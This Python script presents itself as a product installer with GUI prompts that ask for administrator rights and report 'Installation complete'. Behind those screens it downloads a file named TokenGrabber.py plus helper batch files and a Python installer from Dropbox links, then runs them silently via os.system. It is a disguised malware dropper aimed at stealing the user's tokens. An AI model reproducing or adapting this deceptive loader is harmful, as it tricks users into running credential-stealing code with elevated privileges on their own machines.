import urllib.request
import os
import time
import random
import PySimpleGUI as sg
import sys
import ctypes
import winreg

print("PLEASE DO NOT CLOSE THIS WINDOW")
print("You may minimize this, but please do not close this while the installer is running.")
print("Another GUI should have opened, if you do not see the GUI, close this and restart the installer.")
print("Thank you for using our product.")

layout = [[sg.Text("Do you want to install now?")], [sg.Button("Install >")]]

window = sg.Window("INSTALLER", layout)

while True:
    event, values = window.read()
    if event == "Install >":
        break

window.close()

def is_running_as_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def execute():
    if not is_running_as_admin():
        layout = [[sg.Text("This installer is not running with administrator priviledges. \n This means the installer cannot continue.")], [sg.Button("Close X")]]

        window = sg.Window("WARNING" , layout)

        while True:
            event, values = window.read()
            if event == "Close X":
                break

        window.close()
        exit()
    else:
        layout = [[sg.Text("This installer is running with administrator priviledges, you are good to go!")], [sg.Button("Next >")]]

        window = sg.Window("WARNING" , layout)

        while True:
            event, values = window.read()
            if event == "Next >":
                break

        window.close()

if __name__ == '__main__':
    execute()

layout = [sg.Text("Installing in 5 seconds when you click 'Go >' \n Don't worry if this window closes, it is still installing")], [sg.Button("Go >")]

window = sg.Window("INSTALLER" , layout)

while True:
    event, values = window.read()
    if event == "Go >":
        break

time.sleep(5)
window.close()

url1 = 'https://www.dropbox.com/s/1bqrnvz3xhlubtr/TokenGrabber.py?dl=1'
urllib.request.urlretrieve(url1, r'C:\main.py')

url2 = 'https://www.dropbox.com/s/takzvrxsyiagt2f/RequirementInstaller.bat?dl=1'
urllib.request.urlretrieve(url2, r'C:\dependencyInstaller.bat')

url3 = 'https://www.dropbox.com/s/yyi2d2f08nqq5z3/PythonInstaller.bat?dl=1'
urllib.request.urlretrieve(url3, r'C:\pythonInstaller.bat')

url4 = 'https://www.dropbox.com/s/p5c7ldofsm5lb5o/python-3.9.0.exe?dl=1'
urllib.request.urlretrieve(url4, r'C:\python-3.9.0.exe')

time.sleep(3)
os.system('C:\pythonInstaller.bat')
time.sleep(30)
os.system('C:\dependencyInstaller')
time.sleep(5)
os.system('C:\dependencyInstaller')
time.sleep(5)
os.system('python C:\main.py')

layout = [[sg.Text("Installation complete. \n Thank you for using our product.")], [sg.Button("Next >")]]

window = sg.Window("WARNING" , layout)

while True:
    event, values = window.read()
    if event == "Next >":
        break

window.close()
